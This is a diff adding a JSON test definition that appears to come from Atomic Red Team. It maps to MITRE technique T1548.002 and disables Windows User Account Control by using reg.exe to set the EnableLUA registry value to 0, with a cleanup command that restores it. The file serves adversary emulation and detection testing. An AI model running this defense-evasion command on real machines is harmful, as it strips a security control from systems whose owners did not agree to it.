@@ -1,0 +1,26 @@
+{
+    "name": "Disable UAC using reg.exe",
+    "description": "Disable User Account Conrol (UAC) using the builtin tool reg.exe by changing its registry key HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System\\EnableLUA from 1 to 0 ",
+    "supported_platforms": [
+        "windows"
+    ],
+    "executor": {
+        "command": "reg.exe ADD HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System /v EnableLUA /t REG_DWORD /d 0 /f\n",
+        "cleanup_command": "reg.exe ADD HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System /v EnableLUA /t REG_DWORD /d 1 /f\n",
+        "name": "command_prompt",
+        "elevation_required": true,
+        "type": "Command Executor"
+    },
+    "id": "T1548.002",
+    "tactics": [
+        "Privilege Escalation",
+        "Defense Evasion"
+    ],
+    "technique": "Bypass User Account Control",
+    "source": "ART",
+    "uuid": "9e8af564-53ec-407e-aaa8-3cb20c3af7f9",
+    "arguments": null,
+    "preconditions": [],
+    "infrastructure_requirement": [],
+    "side": "Victim"
+}
